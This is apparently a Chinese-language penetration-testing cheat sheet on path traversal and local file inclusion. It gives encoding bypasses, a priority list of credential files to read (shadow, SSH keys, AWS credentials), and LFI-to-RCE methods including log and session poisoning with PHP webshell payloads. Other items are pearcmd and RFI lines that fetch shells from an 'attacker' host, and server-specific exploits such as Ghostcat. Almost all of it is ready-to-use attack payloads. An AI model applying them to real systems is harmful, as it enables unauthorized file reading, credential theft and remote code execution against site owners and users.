# 路径穿越与 LFI 专题

> 编码变体链、LFI→RCE 全路径、PHP wrapper 矩阵、服务器特定技巧（Tomcat/Nginx/Node/IIS）、WooYun 反模式。
> 基础速查见 web-vulnerabilities.md §4.1；文件上传见 §4.2。

---

## 1. 遍历序列变体与绕过

| 变体 | Payload |
|---|---|
| 基础 | `../../../etc/passwd`（Win `..\..\..\windows\win.ini`） |
| URL 编码 | `%2e%2e%2f` / `%2e%2e%5c` |
| 双重编码 | `%252e%252e%252f`（过滤在解码前） |
| 超长 UTF-8 | `..%c0%af`（/）、`..%c1%9c`（\）、`..%c0%ae%c0%ae`（..，GlassFish）、`..%ef%bc%8f` |
| 冗余序列 | `....//`（剥一次 `../` 后仍 `../`）、`..././` |
| 空字节（PHP<5.3.4） | `/etc/passwd%00.jpg` |
| `?` / `#` 截断 | `web.xml%3f` / `passwd#.jpg`（绕后缀白名单） |
| 绝对路径 | `?file=/etc/passwd`（不检查前缀时最简单） |
| Windows UNC | `\\127.0.0.1\C$\Windows\win.ini` |
| Base64 参数 | 服务端 `base64_decode` 后拼接路径 |
| file:// 协议 | 参数进 `WebRequest.Create` 时 `file:///etc/passwd` |
| PHP 路径截断 | 255+ 字符 `/./././` 填充挤掉拼接后缀 |

**错误修复反模式**：`str_replace('../','')` → `....//` 绕过；只查开头 → `./../`；正则不含 `\` → `..\`。

**高频参数**：filename/filepath/path/hdfile/inputFile(Resin)/FileUrl(ASP.NET)/XFileName；page/include/template/lang。**高频端点**：down.php/download.jsp/download.asp/do_download.jsp/GetPage.ashx/pic.php。

## 2. 目标文件优先级

**P0**：`/etc/passwd`、`/etc/shadow`、`~/.ssh/id_rsa`、`~/.bash_history`、`/proc/self/environ`（环境凭据）、`/proc/self/cmdline`、`WEB-INF/web.xml`、`C:\windows\win.ini`、`web.config`。
**P1**：`.env`、`config.php`、`~/.aws/credentials`、`WEB-INF/classes/{jdbc,database}.properties`、`hibernate.cfg.xml`、`applicationContext.xml`、`application.{properties,yml}`、`/WEB-INF/lib/`（下载反编译）、`META-INF/MANIFEST.MF`、日志（apache2/nginx access.log、auth.log、mail.log）、`/tmp/sess_*`。
**升级路径**：文件读 → 凭据（env/config/key）→ 横向 → 日志投毒 → LFI RCE。

## 3. PHP LFI→RCE

| 方法 | 前置 | 操作 |
|---|---|---|
| Apache 日志投毒 | access.log 可读 | UA 注 `<?php system($_GET['c']);?>` → include 日志 |
| SSH 日志投毒 | auth.log 可读 | `ssh '<?php system($_GET["c"]); ?>'@target` → include auth.log |
| Mail 投毒 | mail.log 可读 | SMTP Subject 注 PHP → include mail.log |
| /proc/self/environ | CGI/FastCGI | UA 注 PHP（反射进环境变量）→ include |
| /proc/self/fd 爆破 | Linux | 有上传路径未知时爆破 fd 0~255 找临时句柄 |
| /proc/self/mem + Range | Linux | 目标已加载进内存后删盘: 先读 /proc/self/maps 定位可读段，再 `Range: bytes=START-END` 按 /proc/self/mem 偏移读，输出搜字符串 |
| Session 投毒 | session 变量可控 | `?lang=<?php ...?>` 存 session → include `/tmp/sess_ID` 或 `/var/lib/php/sessions/sess_ID` |
| phpinfo 竞态 | phpinfo 可达 | multipart 上传 → 响应泄漏 tmp_name → ~10ms 窗口并发 include |
| php7 filter 段错误保 tmp | LFI 点 + php7（version-sensitive） | 包含 `php://filter/string.strip_tags/resource=/etc/passwd`（7.0.0≤7.0.27）或 `convert.quoted-printable-encode/resource=data://,%bfAA...%ff`（php7 老版通杀）触发 Segfault → GC 不执行 → POST 的临时文件保留在 /tmp（Linux php+6 随机字符 / Windows php+4）→ 爆破或多发提高命中; 第三种触发: LFI 包含自身造成无限循环最终 SIGSEGV 同样保临时文件（不限 php7） |
| Session Upload Progress | session.upload_progress.enabled=On（默认）+ 代码有 session_start | POST `PHP_SESSION_UPLOAD_PROGRESS` 字段（value=PHP 代码）+ 任意文件上传 → 代码序列化进 `/var/lib/php/sessions/sess_ID`; cleanup=On（默认）时内容读后即清 → 双线程条件竞争（write 持续上传 / read 持续包含）; cleanup=Off 时直接包含。无需任何 session 变量可控——比 ?lang 注入通用 |
| iconv CVE-2024-2961 | glibc<2.39 | convert.iconv 链堆溢出直接 RCE（工具 cnext-exploits） |

核心：**找一个"可注入内容且可被 include"的文件**（日志/session/proc/临时文件）。

## 4. PHP Wrapper 矩阵

**php://filter**（首试）：`convert.base64-encode/resource=index.php` 读源码｜`string.rot13`｜iconv 变换｜链式多重变换。
- **iconv 编码爆破**（编码名被 WAF 拦时）: `convert.iconv.$A$.$B$` 两编码位 python itertools.product 双循环交叉爆破（编码字典） UCS-4*/UCS-4BE/UCS-4LE/UCS-2*/UCS-2BE/UCS-2LE/UTF-32*/UTF-32BE/UTF-32LE/UTF-16*/UTF-16BE/UTF-16LE/UTF-7/UTF7-IMAP/UTF-8*/ASCII*/EUC-JP*/SJIS*/eucJP-win*/SJIS-win*（带 * 的含多种变体），选响应最长的组合即有效编码对。
- **filter chain RCE**：`synacktiv/php_filter_chain_generator`——iconv 链内存写任意 PHP，无需上传。
- **dechunk oracle 盲读**：`synacktiv/php_filter_chains_oracle_exploit` 错误差分逐字符。
- **wrapwrap**（ambionics）：文件内容加前后缀→转 XXE/SSRF/反序列化。
- **死亡 exit 绕过**（`file_put_contents($filename,'<?php exit(); ?>'.$content)` 且 $filename 可控 filter）——写链五法:
  1. base64 首块吞并: 前缀 `php exit()` 与 payload 拼接后整体 base64-decode，构造 `aa`+base64(payload) 使 exit 乱码化（base64 解码忽略非 base64 字符）
  2. `convert.quoted-printable-decode` 吞 `resource=` 的等号（`ª` 类扩展字符对 base64 是可忽略字符，宽字节原理）
  3. `convert.iconv.utf-8.utf-7`: 等号→`+AD0-` 避开 resource= 解析——`php://filter/PD9waHAg...Oz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=x.php`（require 不行: 无该过滤器）
  4. `convert.iconv.UCS-2LE.UCS-2BE` 字节对交换: payload 按 `?<hp pe@av(...)...` 两两交换预编码，写盘后换回
  5. `zlib.deflate|string.tolower|zlib.inflate`: 压缩+小写化+解压使 `exit` 变乱码（`?><?php%0dphpinfo();?>` 拼在 filter 尾）
- **filter write 落盘 + is_numeric 双重校验**（`call_user_func($v1,substr($v2,2))` + `file_put_contents($v3,$str)` 且 v2 必须 is_numeric、v3 走 include）: payload `<?=`tac *`;` 先 base64（消除字母）再整体 hex 编码（消除非数字字符）得纯数字串，v2 前补 `00` 供 substr(2) 剥离，v1=hex2bin，v3=`php://filter/write=convert.base64-decode/resource=muma.php`——写入侧 filter 解码 + 调用侧编码构造的组合范式。

**其他**：`php://input`（allow_url_include=On，POST body 放代码）｜`data://text/plain;base64,PD9waHAg...`（`data://` 被滤试 `data:text/plain`）｜`expect://id`（expect 扩展）｜`zip:///tmp/up.zip%23shell.php`｜`phar://`（触发元数据反序列化→POP 链，可伪装 JPG）。

**pearcmd**（Docker PHP 常见 + register_argc_argv=On）：
- `?file=/usr/local/lib/php/pearcmd.php&+config-create+/<?=phpinfo()?>+/tmp/shell.php`
- `+download+http://attacker/shell.php` / `+install+http://attacker/evil.tgz`

**RFI**（allow_url_include=On）：`?page=http://attacker/shell.txt`。

## 5. 服务器特定技巧

**Java/Spring**：`ClassPathResource(input)`/`getResourceAsStream("/x/"+input)` 拼接；读 `../WEB-INF/web.xml`、`classes/application.properties`；静态资源 `/static/..%252f..%252fWEB-INF/web.xml`。**WAF 拦字面 ../ 时的 Ghost 变体**: `阮阮阯`（窄化还原 ../）、Jetty `%2>` 折叠 `%2E`、Spring CVE-2025-41242 `阮严灵丰丰甲来`→`.%u002e`→`..`（限定条件见 `ghost-bits-cast-attack.md` §4.4）。

**Tomcat**：`/..;/manager/html`——`;` 到 `/` 间被当路径参数剥离，反代不剥 → 绕过；`/%252e%252e/` 双重解码；**Ghostcat CVE-2020-1938**（AJP 8009 暴露）：`ajpShooter.py ... /WEB-INF/web.xml read`；eval 模式经 `javax.servlet.include.servlet_path` 包含已上传文件执行（Tomcat<9.0.31 无 secretRequired）。

**Nginx alias 错配**：`location /assets { alias /data/; }`（location 缺尾斜杠）→ `GET /assets../etc/passwd` = `/data/../etc/passwd`。规则：alias 与 location 结尾斜杠必须一致。

**Node.js**：Express 先解码 `req.params` 再 `path.join` → `/files/..%2f..%2fetc%2fpasswd`；`express.static` 双重编码绕过（中间件先解一次）；`url.parse()`（不归一化）与 `new URL()`（归一化）混用可绕。

**IIS 短文件名**：`GET /W~1.ASP` 404（前缀存在）/400（不存在）差分 → 逐字符枚举（iis_shortname_scanner.jar）。

**Windows 文件 API 通配符**（FindFirstFile 底层、ntifs.h 定义）: `<`=DOS_STAR 匹配 0+ 字符、`>`=DOS_QM 匹配单个字符、`"`=DOS_DOT 匹配点号——`C:\Windows\php<<` 匹配临时文件 `phpXXXX.tmp`（上传+包含同包连发即可执行，无需知道随机名）; `..\..\windows\win<<`。（⚠ 注意 < 才是"多字符"，与直觉相反）

## 6. WooYun 反模式与通用 payload

**审计特征**：PHP `fopen($dir.$_GET['fileName'])`、`url_base64_decode` 后直接 `file_get_contents`；Java `FileInputStream(basePath+param)`、`new File(绝对路径参数)`；ASP.NET `WebRequest.Create(Request["url"])` file:// 未滤；Resin `?inputFile=/etc/passwd`。

**通用 payload**：`/../WEB-INF/web.xml`、`../../WEB-INF/classes/{jdbc,database}.properties`、`hibernate.cfg.xml`、`applicationContext.xml`；通用系统：金智教育 epstar `RaqFileServer?action=open&fileName=/../WEB-INF/web.xml`、`/DownLoad.aspx?Accessory=../web.config`、`/load.jsp?path=../WEB-INF&file=web.xml`。

**绕过分布**：绝对路径直读 > WEB-INF > Base64 参数 > 双重编码 > 超长 UTF-8 > 空字节（legacy）。

**编码变体增补（id 批 1454-1503）**: Unicode 点同形字 U+2E2E(⸮)/U+FF0E(．)/U+2024(․)/U+FE52(﹒)→`.`（校验层 ASCII/执行层归一化差异）; Windows 8.3 短名 `file_l~1` 绕全名黑名单（dir /x 列短名）; 多斜杠 `///flaginfo` 绕 startswith; `/dev/fd/../environ` 绕 /proc 黑名单（/dev/fd→/proc/self/fd symlink 支点，/dev/stdin~stdout 同理）; Ruby Regexp.escape 多字节——GBK 前导字节 0xBF 吃转义反斜杠（宽字节家族）; SSH 日志注入 `ssh '<?php eval($_REQUEST[m]);?>'@目标IP` 后包含 /var/log/auth.log。
